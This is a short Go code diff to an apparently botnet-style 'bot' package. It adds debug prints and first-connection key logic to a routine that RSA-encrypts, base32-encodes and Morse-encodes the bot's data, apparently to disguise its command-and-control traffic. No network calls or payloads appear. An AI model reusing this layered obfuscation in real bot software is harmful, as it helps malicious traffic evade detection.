@@ -4,6 +4,7 @@ import (
 	"bot/morse"
 	"bytes"
 	"encoding/base32"
+	"fmt"
 	"github.com/vmihailenco/msgpack"
 	r "math/rand"
 	"strings"
@@ -76,6 +77,7 @@ func (b *Bot) marshal() []byte {
 	if err != nil {
 		panic(err)
 	}
+	fmt.Println("	Marshalling done")
 	return buf.Bytes()
 }
 
@@ -85,12 +87,14 @@ func (b *Bot) marshal() []byte {
 // 3. Convert RSA encrypted data to base32 encoded data
 // 4. Convert base32 encoded data to morse data
 func (b *Bot) ObfuscateData() []byte {
-	var encryptedData []byte = EncryptData(b.marshal())
-	if IsConnected {
+	var encryptedData []byte
+	if !FirstConnection {
 		encryptedData = EncryptCCP(b.marshal())
 	} else {
 		encryptedData = EncryptData(b.marshal())
+		FirstConnection = false
 	}
 	var encoded_data = base32.StdEncoding.EncodeToString(encryptedData)
+	fmt.Println("	B32 Encoding done")
 	return morse.Encode(encoded_data)
 }
